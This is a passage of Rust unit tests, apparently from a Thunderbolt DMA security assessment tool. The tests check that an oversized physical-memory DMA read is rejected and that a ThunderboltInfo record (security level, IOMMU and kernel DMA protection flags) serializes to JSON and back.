    fn test_dma_read_oversized_rejected() {
        assert!(dma_read_physical(0x1000, 17 * 1024 * 1024).is_err());
    }

    #[test]
    fn test_thunderbolt_info_serialization() {
        let info = ThunderboltInfo {
            generation: ThunderboltGeneration::Thunderbolt3,
            security_level: ThunderboltSecurityLevel::None,
            port_count: 2,
            iommu_enabled: false,
            kernel_dma_protection: false,
            device_name: "Intel JHL6340".to_string(),
            vendor: "Intel".to_string(),
            firmware_version: Some("20.00".to_string()),
            nhi_path: Some("/sys/bus/thunderbolt/devices/0-0".to_string()),
        };
        let json = serde_json::to_string(&info).expect("serialization");
        let deserialized: ThunderboltInfo = serde_json::from_str(&json).expect("deserialization");
        assert_eq!(deserialized.generation, ThunderboltGeneration::Thunderbolt3);
        assert_eq!(deserialized.security_level, ThunderboltSecurityLevel::None);
        assert_eq!(deserialized.port_count, 2);
    }
}
